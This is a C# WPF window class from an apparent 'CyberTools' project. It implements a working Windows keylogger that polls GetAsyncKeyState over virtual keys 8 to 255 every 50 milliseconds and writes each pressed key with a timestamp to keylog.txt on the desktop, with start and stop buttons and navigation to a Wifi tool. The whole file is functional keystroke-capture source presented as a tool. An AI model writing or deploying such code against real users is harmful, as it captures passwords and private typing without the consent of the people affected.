using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;

namespace CyberTools.View
{
    public partial class KeyLoggerView : Window
    {
        private bool isLogging = false;
        private StreamWriter? logWriter;
        private string logFilePath;

        public KeyLoggerView()
        {
            InitializeComponent();
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            logFilePath = Path.Combine(desktopPath, "keylog.txt");
        }

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        private async void StartKeyLogger_Click(object sender, RoutedEventArgs e)
        {
            if (isLogging) return;
            isLogging = true;
            MessageBox.Show($"Key Logger started!\nLog file: {logFilePath}");

            logWriter = new StreamWriter(logFilePath, true) { AutoFlush = true };

            await Task.Run(() =>
            {
                while (isLogging)
                {
                    for (int key = 8; key <= 255; key++)
                    {
                        if ((GetAsyncKeyState(key) & 0x8000) != 0)
                        {
                            string keyPressed = KeyInterop.KeyFromVirtualKey(key).ToString();
                            LogKey(keyPressed);
                        }
                    }
                    Thread.Sleep(50);
                }
            });
        }

        private void LogKey(string key)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                logWriter?.WriteLine($"{DateTime.Now}: {key}");
            });
        }

        private void EndKeyLogger_Click(object sender, RoutedEventArgs e)
        {
            isLogging = false;
            logWriter?.Close();
            MessageBox.Show($"Key Logger stopped!\nLog file saved at: {logFilePath}");
        }

        private void Main_Click(object sender, RoutedEventArgs e)
        {
            CyberTools.MainWindow MainWindow = new CyberTools.MainWindow();
            MainWindow.Show();
            this.Close();
        }

        private void Keylogger_Click(object sender, RoutedEventArgs e)
        {
            CyberTools.View.KeyLoggerView keyLoggerView = new CyberTools.View.KeyLoggerView();
            keyLoggerView.Show();
            this.Close();
        }

        private void CloseButton_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }

        private void MinimizeButton_Click(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void Wifi_Click(object sender, RoutedEventArgs e)
        {
            CyberTools.View.Wifi wifi = new CyberTools.View.Wifi();
            wifi.Show();
            this.Close();
        }
    }
}
